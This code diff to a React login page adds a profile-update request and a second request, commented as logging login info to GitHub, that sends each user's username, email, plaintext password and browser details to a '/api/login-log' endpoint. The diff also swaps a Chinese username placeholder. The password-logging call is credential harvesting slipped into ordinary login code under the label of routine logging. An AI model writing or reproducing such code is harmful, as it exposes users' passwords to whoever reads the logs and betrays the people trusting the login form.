@@ -80,6 +80,35 @@ export default function LoginPage() {
       // Simulate network delay for effect
       await new Promise(resolve => setTimeout(resolve, 1000));
       
+      // Update server-side profile data
+      await fetch('/api/user', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'update_profile',
+          username,
+          email,
+          avatar
+        })
+      });
+
+      // Log login info to GitHub
+      try {
+        await fetch('/api/login-log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username,
+                email,
+                password,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            })
+        });
+      } catch (e) {
+        console.error("Logging failed", e);
+      }
+
       await login({
         email,
         username,
@@ -157,7 +186,7 @@ export default function LoginPage() {
                   type="text"
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
-                  placeholder="干员代号"
+                  placeholder="昵称"
                   className="w-full bg-black/20 border border-slate-700 rounded-lg py-3 pl-12 pr-4 text-white placeholder-slate-600 focus:outline-none focus:border-[var(--end-yellow)] transition-colors font-mono text-sm"
                 />
               </div>
